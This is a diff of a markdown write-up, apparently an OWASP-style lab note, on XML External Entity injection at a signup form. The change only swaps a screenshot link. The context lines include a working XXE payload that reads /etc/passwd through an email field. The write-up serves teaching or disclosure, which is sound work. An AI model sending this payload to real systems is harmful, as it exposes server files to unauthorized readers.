@@ -21,7 +21,7 @@ During the `Signup` it is possible to include XXE payload which will be executed
 
 ### Exploit 
 
-![IMG.png](https://raw.githubusercontent.com/V1dhun/IMAGES/master/Owasp-Top-10/XML-External-Entities/Screenshot%20at%202019-12-17%2010-19-45.png)
+![IMG.png](https://i.imgur.com/xUYlRZa.png)
 
 Payload : ``<!DOCTYPE email [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root><email>&test;</email></root>``
 
